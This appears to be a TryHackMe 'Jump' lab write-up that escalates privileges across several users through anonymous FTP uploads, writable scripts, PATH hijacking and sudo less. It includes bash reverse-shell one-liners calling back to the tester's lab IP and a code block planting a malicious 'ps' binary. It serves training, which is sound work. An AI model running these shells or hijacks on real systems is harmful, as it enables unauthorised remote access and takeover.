# THM Jump Writeup

Privilege escalation

![image](./images/Skzw_SS9zx.png)

as usual, i did an nmap scan and found 2 ports open. 1 ftp, 1 ssh
![image](./images/ByQO_HHczg.png)

did a deeper scan on port 21 and found that anonymous login is allowed
![image](./images/Skq9uSH9Ml.png)

logged in
![image](./images/HkHJtHHqfx.png)

looked at the directory listing and found 2 interesting dir
![image](./images/rJ5-YBr5ze.png)

lets go to 'incoming' first
![image](./images/HkmZ5HScGe.png)
nothing interesting

lets go to 'pub'
![image](./images/SJ1vcSBqfg.png)
read README .txt
![image](./images/HkQyiSB9zx.png)
it tells us what we need to do

before doing as told, let's check out archive and uploads
nothing interesting was there. 

let's do as told in the README.txt file
hint from thm : Add the code #!/bin/bash bash -i >& /dev/tcp/10.82.70.250/5555 0>&1 in a file test.sh and place it in the incoming folder. 10.82.70.250 is the AB IP

just make sure to change your ip
![image](./images/rktqRBScfl.png)

my listener connected, then i just read the file
![image](./images/Skp2RSr9fe.png)

next clue for dev_user is ![image](./images/B1g61LH5fx.png)

so we need to edit the backup script into a reverse shell

checking /opt/dev/backup.sh
![image](./images/r1nq-Ur9Mx.png)
shows that we can edit it

run our reverse shell
![image](./images/Bk7wXUr5zl.png)

our listener was sucssesful so now we just need to grab the flag
![image](./images/Sk0t78BcMe.png)

hint for next flag is 
![image](./images/Sy1l4LSqzx.png)

so we can create our own malicious ps in /opt/dev/bin

```bash!
mkdir -p /opt/dev/bin
echo '#!/bin/bash
bash -i >& /dev/tcp/10.82.84.138/5557 0>&1' > /opt/dev/bin/ps
chmod +x /opt/dev/bin/ps
```

got in
![image](./images/ryvJ8LHcze.png)

got the flag
![image](./images/HJPXIIH9fe.png)

for the next flag which is ops_user's flag, i first tried going to the dir but was denied
![image](./images/Bk7AULB9Mx.png)

i did sudo -l (something you should always do when doing privilege escalation)
![image](./images/Hy4SvLScfx.png)
it shows that i can execulte deploy.sh as ops_user without a pass

looking at the script gave me this
![image](./images/rJLRvIH5zl.png)

checking the permission shows that we cant edit the script
![image](./images/Skqx_8r9fe.png)

let's check deploy_helper.sh
![image](./images/HJja_Ur5Ml.png)

we can modify deploy_helper.sh and create a reverse shell
dont forget to rewrite permission and run with sudo as user ops_user
![image](./images/BJgMcIB9Mx.png)
we are now ops_user

now lets go to the dir that we couldnt go to previously
![image](./images/rkYP5USqMg.png)

lastly, we have to gain root access
hint : 
![image](./images/HyQscUrqze.png)

checking /usr/bin/less
![image](./images/ByUdjUH9fe.png)

doing ``` sudo -l ``` also confirms the hint given
![image](./images/rym6s8ScGx.png)

tried running
```bash!
sudo /usr/bin/less /etc/passwd
```
to get inside the less viewer (where you're looking at the /etc/passwd contents)

after awhile i went to GTFOBins for less comands and found
```bash!
sudo -u root less /PATHTOFILE
```

running it got me the last flag
![image](./images/BkmQ-PHczl.png)

Overall Chain : 
FTP
 ↓
incoming/test.sh → reverse shell
 ↓
recon_user
 ↓
writable /opt/dev/backup.sh → reverse shell
 ↓
PATH hijacking via ps
 ↓
monitor_user
 ↓
writable deploy_helper.sh → ops_user
 ↓
sudo less as root
 ↓
/root/flag.txt

Lesson : 
- always run sudo -l for clues
- 
